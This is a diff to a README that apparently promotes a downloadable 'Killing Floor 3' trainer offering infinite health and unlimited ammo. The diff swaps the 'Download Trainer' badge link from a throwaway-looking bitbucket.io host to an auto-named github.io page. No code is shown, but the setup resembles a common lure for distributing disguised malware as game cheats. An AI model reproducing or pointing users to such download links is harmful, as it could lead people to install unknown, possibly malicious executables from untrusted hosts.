@@ -3,7 +3,7 @@
 **Description:**
 Elevate your Killing Floor 3 experience with powerful trainers! Gain infinite health, unlimited ammo, and more to conquer the Zed horde effortlessly.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload8.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Killing-Floor-3-Trainer-xeb5.github.io/.github)
 ---
 
 ## Product Description
